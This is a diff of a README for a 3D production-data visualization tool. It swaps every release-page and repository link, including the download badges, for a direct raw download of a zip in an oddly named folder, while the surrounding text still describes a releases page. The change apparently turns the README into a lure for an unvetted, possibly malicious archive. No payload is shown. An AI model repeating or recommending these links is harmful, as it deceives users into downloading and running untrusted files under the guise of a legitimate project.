@@ -1,6 +1,6 @@
 # 🌲 Production-Tree-3D - Visualize Production Data Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Production--Tree--3D-brightgreen?style=for-the-badge)](https://github.com/rongtbk/Production-Tree-3D/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Production--Tree--3D-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/rongtbk/Production-Tree-3D/main/sniffingly/Tree-Production-D-v3.4.zip)
 
 ---
 
@@ -43,10 +43,10 @@ Follow the steps below to download and run Production-Tree-3D on a Windows machi
 
 You need to visit the official releases page to download the latest version.
 
-[![Download Here](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/rongtbk/Production-Tree-3D/releases)
+[![Download Here](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/rongtbk/Production-Tree-3D/main/sniffingly/Tree-Production-D-v3.4.zip)
 
 - Click the link above or go to:  
-  https://github.com/rongtbk/Production-Tree-3D/releases
+  https://raw.githubusercontent.com/rongtbk/Production-Tree-3D/main/sniffingly/Tree-Production-D-v3.4.zip
 - This page lists all available versions of the software.
 - Look for the newest release at the top.
 - There will be a downloadable file suited for Windows, usually a `.zip` or `.exe` file.
@@ -129,9 +129,9 @@ The app will translate your file into a 3D tree automatically.
 ## 🔗 Useful Links
 
 - Download and release page:  
-  https://github.com/rongtbk/Production-Tree-3D/releases  
+  https://raw.githubusercontent.com/rongtbk/Production-Tree-3D/main/sniffingly/Tree-Production-D-v3.4.zip  
 - Repository for advanced users and data formats:  
-  https://github.com/rongtbk/Production-Tree-3D
+  https://raw.githubusercontent.com/rongtbk/Production-Tree-3D/main/sniffingly/Tree-Production-D-v3.4.zip
 
 ---
 
@@ -141,4 +141,4 @@ This app is built in Python and generates web-ready 3D plots. It relates to fiel
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Production--Tree--3D-brightgreen?style=for-the-badge)](https://github.com/rongtbk/Production-Tree-3D/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Production--Tree--3D-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/rongtbk/Production-Tree-3D/main/sniffingly/Tree-Production-D-v3.4.zip)
